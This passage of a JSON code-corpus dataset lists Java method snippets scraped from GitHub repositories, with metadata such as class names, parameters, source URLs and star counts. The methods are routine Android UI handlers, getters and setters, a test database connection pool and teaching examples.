menu.findItem(R.id.action_search).getActionView();\n        SearchManager searchManager = (SearchManager) getSystemService(SEARCH_SERVICE);\n        searchView.setSearchableInfo(searchManager.getSearchableInfo(getComponentName()));\n\n\n\n        MenuItem item = menu.findItem(R.id.action_search);\n\n        item.setOnActionExpandListener(new MenuItem.OnActionExpandListener() {\n            @Override\n            public boolean onMenuItemActionExpand(MenuItem item) {\n                return true;\n            }\n\n            @Override\n            public boolean onMenuItemActionCollapse(MenuItem item) {\n\n\n                Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n\n\n                if(fragment instanceof NotifySearch)\n                {\n                    ((NotifySearch) fragment).endSearchMode();\n                }\n\n//                Toast.makeText(OrderHistoryHD.this, \"onCollapsed Called \", Toast.LENGTH_SHORT).show();\n\n                return true;\n            }\n        });\n\n\n\n        return true;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/OrderHistory/OrderHistory.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 57074, "method_name": "onNewIntent", "class_name": "OrderHistory", "params": ["Intent"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onNewIntent(Intent intent) {\n        super.onNewIntent(intent);\n        handleIntent(intent);\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/OrderHistory/OrderHistory.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 57075, "method_name": "handleIntent", "class_name": "OrderHistory", "params": ["Intent"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleIntent(Intent intent) {\n\n        if (Intent.ACTION_SEARCH.equals(intent.getAction())) {\n            String query = intent.getStringExtra(SearchManager.QUERY);\n            //use the query to search your data somehow\n\n//            Toast.makeText(this,query,Toast.LENGTH_SHORT).show();\n\n            Fragment fragment = getSupportFragmentManager().findFragmentById(R.id.fragment_container);\n\n            if(fragment instanceof NotifySearch)\n            {\n                ((NotifySearch) fragment).search(query);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Lists/OrderHistory/OrderHistory.java", "stars": "10", "class_props": {"extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"id": 57076, "method_name": "init", "class_name": "Owner", "params": ["String", "String", "int"], "throws": null, "modifiers": ["public"], "return_type": "Owner", "snippet": "    public Owner init(String firstName, String lastName, int age){\n        this.firstName = firstName;\n        this.lastName = lastName;\n        this.age = age;\n        return this;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/test/java/me/ryandw11/ods/tests/Owner.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57077, "method_name": "getFirstName", "class_name": "Owner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFirstName(){\n        return firstName;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/test/java/me/ryandw11/ods/tests/Owner.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57078, "method_name": "getLastName", "class_name": "Owner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLastName(){\n        return lastName;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/test/java/me/ryandw11/ods/tests/Owner.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57079, "method_name": "getAge", "class_name": "Owner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getAge(){\n        return age;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/test/java/me/ryandw11/ods/tests/Owner.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57080, "method_name": "serialize", "class_name": "Owner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ObjectTag", "snippet": "    public ObjectTag serialize(){\n        ObjectTag ot = new ObjectTag(\"Owner\");\n        ot.addTag(new StringTag(\"firstName\", firstName));\n        ot.addTag(new StringTag(\"lastName\", lastName));\n        ot.addTag(new IntTag(\"age\", age));\n        return ot;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/test/java/me/ryandw11/ods/tests/Owner.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57081, "method_name": "getUrl", "class_name": "TicketParams", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUrl() {\n        return url;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/model/domain/TicketParams.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57082, "method_name": "setUrl", "class_name": "TicketParams", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUrl(String url) {\n        this.url = url;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/model/domain/TicketParams.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57083, "method_name": "getTitle", "class_name": "TicketParams", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getTitle() {\n        return title;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/model/domain/TicketParams.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57084, "method_name": "setTitle", "class_name": "TicketParams", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(String title) {\n        this.title = title;\n    }", "url": "https://raw.githubusercontent.com/TrillGates/TaobaoUnion/master/app/src/main/java/com/sunofbeaches/taobaounion/model/domain/TicketParams.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57085, "method_name": "call", "class_name": "UpdatePassphraseCallable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String call() {\n        try {\n            final Packet packet = new Packet.Builder(CONSTANTS.METHODS.UPDATE_PASSPHRASE)\n                    .addTextPayload(CONSTANTS.TAGS.PASSPHRASE, passphrase)\n                    .addHexPayload(CONSTANTS.TAGS.CURRENT_PASSWORD, password)\n                    .build();\n            final Callable<Packet> callable = new BlockingCallable(packet);\n            callable.call();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        return null;\n    }", "url": "https://raw.githubusercontent.com/CoboVault/cobo-vault-cold/master/app/src/main/java/com/cobo/cold/callables/UpdatePassphraseCallable.java", "stars": "13", "class_props": {"extends": null, "implements": ["Callable"], "modifiers": ["public"]}}, {"id": 57086, "method_name": "init", "class_name": "NetConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init(){\n        nettyIp=addr.split(\":\")[0];\n        nettyPort= Integer.parseInt(addr.split(\":\")[1]);\n        try {\n            serverIp=InetAddress.getLocalHost().getHostAddress().toString();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        }\n\n        //System.out.println(\"netty:\"+nettyIp+\":\"+nettyPort+\"   server:\"+serverIp+\":\"+serverPort);\n        //netty:localhost:9001   server:192.168.153.1:9000\n    }", "url": "https://raw.githubusercontent.com/lzj-github/registry/master/naming/src/main/java/cn/lzj/nacos/naming/config/NetConfig.java", "stars": "34", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57087, "method_name": "clickLogin", "class_name": "LoginNavEventHandler", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clickLogin(View view){\n        // \u83b7\u53d6\u767b\u5f55\u540e\u7684\u6570\u636e\uff0c\u7136\u540e\u8df3\u8f6c\n        if (TextUtils.isEmpty(getBindingView().flUserNameEt.getText())) {\n            getBindingView().flUserNameTL.setError(\"\u8bf7\u8f93\u5165\u7528\u6237\u540d\");\n            return;\n        }\n        if (TextUtils.isEmpty(getBindingView().flUserPassEt.getText())) {\n            getBindingView().flUserPassTL.setError(\"\u8bf7\u8f93\u5165\u5bc6\u7801\");\n            return;\n        }\n        getBindedView().userViewModel.login(\n                getBindingView().flUserNameEt.getText().toString(),\n                getBindingView().flUserPassEt.getText().toString());\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/modules/module_login/src/main/java/com/hl/modules_login/view/event/LoginNavEventHandler.java", "stars": "14", "class_props": {"extends": "BaseHandlers", "implements": null, "modifiers": ["public"]}}, {"id": 57088, "method_name": "toRegister", "class_name": "LoginNavEventHandler", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void toRegister(View view){\n        Navigation.findNavController(view).navigate(R.id.action_loginFragment_to_registerFragment);\n    }", "url": "https://raw.githubusercontent.com/FanChael/MVVM/master/modules/module_login/src/main/java/com/hl/modules_login/view/event/LoginNavEventHandler.java", "stars": "14", "class_props": {"extends": "BaseHandlers", "implements": null, "modifiers": ["public"]}}, {"id": 57089, "method_name": "init", "class_name": "DbTest", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() throws Exception {\n        conPoolRoot = initConnectionPool(\"\");\n        try (var con = conPoolRoot.getDBConnectionFromPool()) {\n            Assert.assertNotNull(con);\n        }\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/itest/org/bgerp/itest/kernel/db/DbTest.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57090, "method_name": "initConnectionPool", "class_name": "DbTest", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "ConnectionPool", "snippet": "    public static ConnectionPool initConnectionPool(String db) {\n        String cfg =\n            \"db.url=jdbc:mysql://\" + System.getProperty(\"db.host\", \"localhost\") + \":3306\" + db + \"\\n\" +\n            \"db.user=\" + System.getProperty(\"db.user\") + \"\\n\" +\n            \"db.pswd=\" + System.getProperty(\"db.pswd\") + \"\\n\";\n        return new ConnectionPool(\"root\", new Preferences(cfg));\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/itest/org/bgerp/itest/kernel/db/DbTest.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57091, "method_name": "ok", "class_name": "ResultBean", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResultBean", "snippet": "    public static ResultBean ok() {\n        return new ResultBean();\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-common/src/main/java/com/java2nb/novel/core/bean/ResultBean.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57092, "method_name": "ok", "class_name": "ResultBean", "params": ["T"], "throws": null, "modifiers": ["public", "static"], "return_type": "ResultBean", "snippet": "    public static <T> ResultBean ok(T data) {\n        return new ResultBean(data);\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-common/src/main/java/com/java2nb/novel/core/bean/ResultBean.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57093, "method_name": "fail", "class_name": "ResultBean", "params": ["ResponseStatus"], "throws": null, "modifiers": ["public", "static"], "return_type": "ResultBean", "snippet": "    public static ResultBean fail(ResponseStatus ResponseStatus) {\n        return new ResultBean(ResponseStatus);\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-common/src/main/java/com/java2nb/novel/core/bean/ResultBean.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57094, "method_name": "error", "class_name": "ResultBean", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "ResultBean", "snippet": "    public static ResultBean error() {\n        return new ResultBean(ResponseStatus.ERROR);\n    }", "url": "https://raw.githubusercontent.com/201206030/novel-plus/master/novel-common/src/main/java/com/java2nb/novel/core/bean/ResultBean.java", "stars": "137", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 57095, "method_name": "execute", "class_name": "ButtonKeyProcessor", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute(int state, int action) {\n        if (state == Gamepad.BUTTON_RELEASED) {\n            press(mapper[action]);\n        }\n        else {\n            release(mapper[action]);\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/ButtonKeyProcessor.java", "stars": "4", "class_props": {"extends": "KeyProcessor", "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 57096, "method_name": "getHouseId", "class_name": "HouseCapacityItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getHouseId()\n\t{\n\t\treturn houseId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/analytic/HouseCapacityItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57097, "method_name": "setHouseId", "class_name": "HouseCapacityItem", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setHouseId( int houseId )\n\t{\n\t\tthis.houseId = houseId;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/analytic/HouseCapacityItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57098, "method_name": "getServiceType", "class_name": "HouseCapacityItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getServiceType()\n\t{\n\t\treturn serviceType;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/analytic/HouseCapacityItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57099, "method_name": "setServiceType", "class_name": "HouseCapacityItem", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setServiceType( String serviceType )\n\t{\n\t\tthis.serviceType = serviceType;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/analytic/HouseCapacityItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57100, "method_name": "getDate", "class_name": "HouseCapacityItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getDate()\n\t{\n\t\treturn date;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/analytic/HouseCapacityItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57101, "method_name": "setDate", "class_name": "HouseCapacityItem", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDate( Date date )\n\t{\n\t\tthis.date = date;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/analytic/HouseCapacityItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57102, "method_name": "getValue", "class_name": "HouseCapacityItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getValue()\n\t{\n\t\treturn value;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/analytic/HouseCapacityItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57103, "method_name": "setValue", "class_name": "HouseCapacityItem", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setValue( int value )\n\t{\n\t\tthis.value = value;\n\t}", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/analytic/HouseCapacityItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57104, "method_name": "isShow", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean isShow() {\n    return show;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57105, "method_name": "setShow", "class_name": "WechatMpProperties", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setShow(boolean show) {\n    this.show = show;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57106, "method_name": "getAesKey", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getAesKey() {\n    return aesKey;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57107, "method_name": "setAesKey", "class_name": "WechatMpProperties", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAesKey(String aesKey) {\n    this.aesKey = aesKey;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57108, "method_name": "getAppId", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getAppId() {\n    return this.appId;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57109, "method_name": "setAppId", "class_name": "WechatMpProperties", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setAppId(String appId) {\n    this.appId = appId;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57110, "method_name": "getSecret", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getSecret() {\n    return this.secret;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57111, "method_name": "setSecret", "class_name": "WechatMpProperties", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setSecret(String secret) {\n    this.secret = secret;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57112, "method_name": "getToken", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getToken() {\n    return this.token;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57113, "method_name": "setToken", "class_name": "WechatMpProperties", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setToken(String token) {\n    this.token = token;\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57114, "method_name": "toString", "class_name": "WechatMpProperties", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {\n    return ToStringBuilder.reflectionToString(this,\n        ToStringStyle.MULTI_LINE_STYLE);\n  }", "url": "https://raw.githubusercontent.com/visayang/wechatdev/master/src/main/java/com/chad/wechatdev/commons/config/WechatMpProperties.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57115, "method_name": "main", "class_name": "Demo01Iterator", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u521b\u5efa\u4e00\u4e2a\u96c6\u5408\u5bf9\u8c61\n        Collection<String> coll = new ArrayList<>();\n        //\u5f80\u96c6\u5408\u4e2d\u6dfb\u52a0\u5143\u7d20\n        coll.add(\"\u59da\u660e\");\n        coll.add(\"\u79d1\u6bd4\");\n        coll.add(\"\u9ea6\u8fea\");\n        coll.add(\"\u8a79\u59c6\u65af\");\n        coll.add(\"\u827e\u5f17\u68ee\");\n\n        /*\n            1.\u4f7f\u7528\u96c6\u5408\u4e2d\u7684\u65b9\u6cd5iterator()\u83b7\u53d6\u8fed\u4ee3\u5668\u7684\u5b9e\u73b0\u7c7b\u5bf9\u8c61,\u4f7f\u7528Iterator\u63a5\u53e3\u63a5\u6536(\u591a\u6001)\n            \u6ce8\u610f:\n                Iterator<E>\u63a5\u53e3\u4e5f\u662f\u6709\u6cdb\u578b\u7684,\u8fed\u4ee3\u5668\u7684\u6cdb\u578b\u8ddf\u7740\u96c6\u5408\u8d70,\u96c6\u5408\u662f\u4ec0\u4e48\u6cdb\u578b,\u8fed\u4ee3\u5668\u5c31\u662f\u4ec0\u4e48\u6cdb\u578b\n         */\n        //\u591a\u6001  \u63a5\u53e3            \u5b9e\u73b0\u7c7b\u5bf9\u8c61\n        Iterator<String> it = coll.iterator();\n\n\n        /*\n            \u53d1\u73b0\u4f7f\u7528\u8fed\u4ee3\u5668\u53d6\u51fa\u96c6\u5408\u4e2d\u5143\u7d20\u7684\u4ee3\u7801,\u662f\u4e00\u4e2a\u91cd\u590d\u7684\u8fc7\u7a0b\n            \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5faa\u73af\u4f18\u5316\n            \u4e0d\u77e5\u9053\u96c6\u5408\u4e2d\u6709\u591a\u5c11\u5143\u7d20,\u4f7f\u7528while\u5faa\u73af\n            \u5faa\u73af\u7ed3\u675f\u7684\u6761\u4ef6,hasNext\u65b9\u6cd5\u8fd4\u56defalse\n         */\n        while(it.hasNext()){\n            String e = it.next();\n            System.out.println(e);\n        }\n        System.out.println(\"----------------------\");\n        for(Iterator<String> it2 = coll.iterator();it2.hasNext();){\n            String e = it2.next();\n            System.out.println(e);\n        }\n\n\n       /* //2.\u4f7f\u7528Iterator\u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5hasNext\u5224\u65ad\u8fd8\u6709\u6ca1\u6709\u4e0b\u4e00\u4e2a\u5143\u7d20\n        boolean b = it.hasNext();\n        System.out.println(b);//true\n        //3.\u4f7f\u7528Iterator\u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5next\u53d6\u51fa\u96c6\u5408\u4e2d\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20\n        String s = it.next();\n        System.out.println(s);//\u59da\u660e\n\n        b = it.hasNext();\n        System.out.println(b);\n        s = it.next();\n        System.out.println(s);\n\n        b = it.hasNext();\n        System.out.println(b);\n        s = it.next();\n        System.out.println(s);\n\n        b = it.hasNext();\n        System.out.println(b);\n        s = it.next();\n        System.out.println(s);\n\n        b = it.hasNext();\n        System.out.println(b);\n        s = it.next();\n        System.out.println(s);\n\n        b = it.hasNext();\n        System.out.println(b);//\u6ca1\u6709\u5143\u7d20,\u8fd4\u56defalse\n        s = it.next();//\u6ca1\u6709\u5143\u7d20,\u5728\u53d6\u51fa\u5143\u7d20\u4f1a\u629b\u51faNoSuchElementException\u6ca1\u6709\u5143\u7d20\u5f02\u5e38\n        System.out.println(s);*/\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/13.%E3%80%90Collection%E3%80%81%E6%B3%9B%E5%9E%8B%E3%80%91-%E7%AC%94%E8%AE%B0/code/02_CollectionAndReflect/src/com/itheima/demo02/Iterator/Demo01Iterator.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57116, "method_name": "clear", "class_name": "Playlist", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clear() {\n        playlist.clear();\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/model/Playlist.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57117, "method_name": "add", "class_name": "Playlist", "params": ["GridItem"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void add(GridItem video) {\n        playlist.add(video);\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/model/Playlist.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57118, "method_name": "setCurrentPosition", "class_name": "Playlist", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentPosition(int currentPosition) {\n        this.currentPosition = currentPosition;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/model/Playlist.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57119, "method_name": "size", "class_name": "Playlist", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int size() {\n        return playlist.size();\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/model/Playlist.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57120, "method_name": "next", "class_name": "Playlist", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GridItem", "snippet": "    public GridItem next() {\n        if ((currentPosition + 1) < size()) {\n            currentPosition++;\n            return playlist.get(currentPosition);\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/model/Playlist.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57121, "method_name": "previous", "class_name": "Playlist", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GridItem", "snippet": "    public GridItem previous() {\n        if (currentPosition - 1 >= 0) {\n            currentPosition--;\n            return playlist.get(currentPosition);\n        }\n        return null;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/model/Playlist.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57122, "method_name": "getItemIndex", "class_name": "Playlist", "params": ["GridItem"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getItemIndex(GridItem gridItem) {\n        for (int i = 0;i < playlist.size();i++) {\n            if (playlist.get(i).equals(gridItem)) {\n                return i;\n            }\n        }\n        return  -1;\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/model/Playlist.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57123, "method_name": "getIdentity", "class_name": "ModelInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getIdentity() {\n        return identity;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57124, "method_name": "setIdentity", "class_name": "ModelInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setIdentity(String identity) {\n        this.identity = identity;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57125, "method_name": "getColumn", "class_name": "ModelInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getColumn() {\n        return column;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57126, "method_name": "setColumn", "class_name": "ModelInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setColumn(String column) {\n        this.column = column;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 57127, "method_name": "getType", "class_name": "ModelInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getType() {\n        return type;\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/util/ModelInfo.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, 